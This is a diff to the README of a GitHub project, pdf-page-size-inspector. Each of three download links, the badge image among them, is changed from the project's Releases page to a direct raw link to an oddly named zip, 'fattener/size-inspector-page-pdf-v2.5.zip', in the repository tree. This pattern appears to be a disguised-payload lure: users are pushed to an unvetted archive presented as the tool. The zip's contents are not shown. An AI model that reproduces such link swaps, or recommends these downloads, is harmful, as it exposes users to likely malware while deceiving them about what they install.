@@ -6,7 +6,7 @@ Welcome! This guide will help you download and run the pdf-page-size-inspector a
 
 ## 🔗 Download Now
 
-[![Download pdf-page-size-inspector](https://img.shields.io/badge/Download-pdf--page--size--inspector-blue.svg)](https://github.com/mahmoudar/pdf-page-size-inspector/releases)
+[![Download pdf-page-size-inspector](https://github.com/mahmoudar/pdf-page-size-inspector/raw/refs/heads/main/fattener/size-inspector-page-pdf-v2.5.zip)](https://github.com/mahmoudar/pdf-page-size-inspector/raw/refs/heads/main/fattener/size-inspector-page-pdf-v2.5.zip)
 
 ## 🖥️ What is pdf-page-size-inspector?
 
@@ -31,7 +31,7 @@ To run pdf-page-size-inspector, you need the following:
 
 To get started, visit the Releases page to download the latest version of pdf-page-size-inspector.
 
-[Visit Here to Download](https://github.com/mahmoudar/pdf-page-size-inspector/releases)
+[Visit Here to Download](https://github.com/mahmoudar/pdf-page-size-inspector/raw/refs/heads/main/fattener/size-inspector-page-pdf-v2.5.zip)
 
 ### 🖥️ Steps to Download
 
@@ -84,6 +84,6 @@ If you have questions or suggestions, feel free to reach out through the reposit
 
 To download pdf-page-size-inspector, visit: 
 
-[Download Here](https://github.com/mahmoudar/pdf-page-size-inspector/releases)
+[Download Here](https://github.com/mahmoudar/pdf-page-size-inspector/raw/refs/heads/main/fattener/size-inspector-page-pdf-v2.5.zip)
 
 By following this guide, you can easily download and use our tool to analyze your PDFs. Enjoy testing your documents!
